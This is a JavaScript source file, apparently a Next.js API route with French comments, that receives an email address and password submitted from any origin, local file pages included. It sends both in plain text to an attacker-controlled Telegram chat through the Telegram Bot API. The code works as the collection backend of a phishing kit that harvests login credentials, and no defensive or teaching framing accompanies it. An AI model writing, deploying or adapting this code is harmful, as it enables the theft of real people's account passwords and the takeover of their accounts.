// pages/api/webhook.js
export default async function handler(req, res) {
  // --- CORS: autoriser toutes les origines (y compris file:// qui envoie "null")
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");

  // Répondre aux requêtes préflight OPTIONS (nécessaire pour CORS)
  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  // N'accepter que POST pour le traitement réel
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Méthode non autorisée" });
  }

  try {
    const { email, motDePasse } = req.body || {};

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Variables d'environnement manquantes");
      return res.status(500).json({ error: "Configuration serveur incomplète" });
    }

    const message = `Nouvelle soumission :\n\nEmail : ${email}\nMot de passe : ${motDePasse}`;

    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const telegramResponse = await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });

    if (!telegramResponse.ok) {
      const text = await telegramResponse.text();
      console.error("Telegram returned error:", text);
      return res.status(500).json({ error: "Erreur lors de l'envoi à Telegram", details: text });
    }

    return res.status(200).json({ success: true, message: "Données envoyées à Telegram" });
  } catch (error) {
    console.error("Erreur serveur:", error);
    return res.status(500).json({ error: "Erreur serveur" });
  }
}
